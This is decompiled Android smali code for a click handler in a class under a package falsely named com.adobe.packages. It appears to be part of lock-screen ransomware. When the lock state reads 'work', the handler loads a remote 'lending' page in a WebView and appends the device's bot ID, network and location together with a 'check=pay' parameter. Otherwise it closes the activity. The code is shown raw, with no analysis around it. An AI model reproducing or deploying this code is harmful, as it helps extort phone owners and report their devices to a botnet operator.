.class Lcom/adobe/packages/LCK$1;
.super Ljava/lang/Object;
.source "LCK.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/packages/LCK;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/packages/LCK;

.field private final synthetic val$BotID:Ljava/lang/String;

.field private final synthetic val$BotLocation:Ljava/lang/String;

.field private final synthetic val$BotNetwork:Ljava/lang/String;

.field private final synthetic val$lending:Landroid/webkit/WebView;


# direct methods
.method constructor <init>(Lcom/adobe/packages/LCK;Landroid/webkit/WebView;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/packages/LCK$1;->this$0:Lcom/adobe/packages/LCK;

    iput-object p2, p0, Lcom/adobe/packages/LCK$1;->val$lending:Landroid/webkit/WebView;

    iput-object p3, p0, Lcom/adobe/packages/LCK$1;->val$BotID:Ljava/lang/String;

    iput-object p4, p0, Lcom/adobe/packages/LCK$1;->val$BotNetwork:Ljava/lang/String;

    iput-object p5, p0, Lcom/adobe/packages/LCK$1;->val$BotLocation:Ljava/lang/String;

    .line 86
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 5
    .param p1, "arg0"    # Landroid/view/View;

    .prologue
    .line 90
    iget-object v1, p0, Lcom/adobe/packages/LCK$1;->this$0:Lcom/adobe/packages/LCK;

    const-string v2, "lock"

    invoke-static {v1, v2}, Lcom/adobe/packages/LCK;->access$0(Lcom/adobe/packages/LCK;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 92
    .local v0, "ra":Ljava/lang/String;
    const-string v1, "work"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 93
    iget-object v1, p0, Lcom/adobe/packages/LCK$1;->val$lending:Landroid/webkit/WebView;

    new-instance v2, Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/adobe/packages/LCK$1;->this$0:Lcom/adobe/packages/LCK;

    const-string v4, "lending"

    invoke-static {v3, v4}, Lcom/adobe/packages/LCK;->access$0(Lcom/adobe/packages/LCK;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "?botid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/adobe/packages/LCK$1;->val$BotID:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&network="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/adobe/packages/LCK$1;->val$BotNetwork:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&location="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/adobe/packages/LCK$1;->val$BotLocation:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&check=pay"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 99
    :goto_0
    return-void

    .line 97
    :cond_0
    iget-object v1, p0, Lcom/adobe/packages/LCK$1;->this$0:Lcom/adobe/packages/LCK;

    invoke-virtual {v1}, Lcom/adobe/packages/LCK;->finish()V

    goto :goto_0
.end method
